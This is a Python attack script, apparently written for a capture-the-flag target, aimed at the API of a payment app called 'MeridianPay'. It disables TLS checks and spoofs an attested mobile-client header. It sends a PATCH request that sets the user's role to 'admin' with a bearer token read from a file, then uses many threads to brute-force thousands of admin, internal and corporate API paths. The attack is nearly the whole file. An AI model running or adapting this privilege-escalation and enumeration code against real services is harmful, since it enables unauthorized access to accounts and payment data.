import json, ssl, urllib.request, urllib.error, sys
from concurrent.futures import ThreadPoolExecutor
BASE = "https://web-3f25599ac74e8a91.web.h7tex.com"
CTX = ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
CL = "MeridianPay-Android/3.2.1 (attested)"

def call(p, mode, t, m="GET"):
    hh = {"Content-Type": "application/json"}
    if mode in ("both", "attested"): hh["X-Meridian-Client"] = CL
    if mode in ("both", "bearer") and t: hh["Authorization"] = "Bearer " + t
    r = urllib.request.Request(BASE+p, method=m, headers=hh)
    try:
        with urllib.request.urlopen(r, context=CTX, timeout=12) as f: return f.status, f.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e: return e.code, e.read().decode("utf-8","replace")
    except Exception as e: return None, repr(e)

t = open("T2.txt").read().strip()
# make sure this token is admin
import json as J
r = urllib.request.Request(BASE+"/api/v1/profile", data=J.dumps({"role":"admin"}).encode(), method="PATCH",
    headers={"Content-Type":"application/json","X-Meridian-Client":CL,"Authorization":"Bearer "+t})
urllib.request.urlopen(r, context=CTX, timeout=12)

NOUN = open("nouns.txt").read().split()
TAIL = ["/me", "/flag", "/export", "/1001", "/1", "/current", "/all", "/latest", "/internal", "/public", "/raw", "/keys", "/list"]
PRE = ["/", "/api/", "/api/v1/", "/api/v1/internal/", "/api/v1/admin/", "/api/v1/auth/",
       "/api/v1/accounts/", "/api/v1/promo/", "/v1/", "/internal/", "/admin/", "/mobile/",
       "/api/v1/devices/", "/api/v1/sessions/", "/api/v1/receipts/", "/api/v1/ledger/", "/api/v1/corporate/"]
paths = set()
for pre in PRE:
    for n in NOUN:
        paths.add(pre + n)
        if pre in ("/api/v1/", "/api/v1/admin/", "/api/v1/internal/", "/api/v1/accounts/", "/api/v1/corporate/"):
            for tl in TAIL[:6]:
                paths.add(pre + n + tl)
paths = sorted(paths)
print("paths", len(paths), flush=True)

def work(p):
    outs = []
    for mode in ("both", "bearer"):
        c, b = call(p, mode, t)
        if not (c == 404 and "404 Not Found" in b):
            outs.append((mode, c, b[:200]))
    return (p, outs) if outs else None

with ThreadPoolExecutor(max_workers=14) as ex:
    for i, r in enumerate(ex.map(work, paths)):
        if r: print("HIT", r[0], r[1], flush=True)
        if i % 2000 == 0: print("...", i, flush=True)
print("ADMIN-SWEEP DONE")
